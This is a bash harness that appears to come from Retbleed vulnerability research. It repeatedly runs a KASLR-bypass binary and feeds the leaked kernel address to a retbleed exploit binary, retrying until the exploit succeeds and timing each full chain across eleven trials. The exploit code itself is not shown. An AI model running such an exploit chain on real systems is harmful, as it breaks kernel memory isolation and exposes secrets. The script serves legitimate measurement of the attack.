#!/bin/bash
make
OUTDIR=outdir-$(date '+%F__%X')

if [ -e $OUTDIR ]; then
  exit 1
fi
mkdir $OUTDIR
echo $OUTDIR

for a in {0..10}; do
  LOG="$OUTDIR/log_$a.txt"
  t0=$(date '+%s.%N')
  KTEXT=$(./break_kaslr | awk '{print $2}')
  while ! ./retbleed $KTEXT | tee $LOG; do
    true
  done
  t=$(bc <<< "$(date '+%s.%N') - $t0")
  killall noisy_neighbor
  killall lol
  echo "FULL CHAIN TIME: ${t}s" | tee -a $LOG
  sleep 5
done
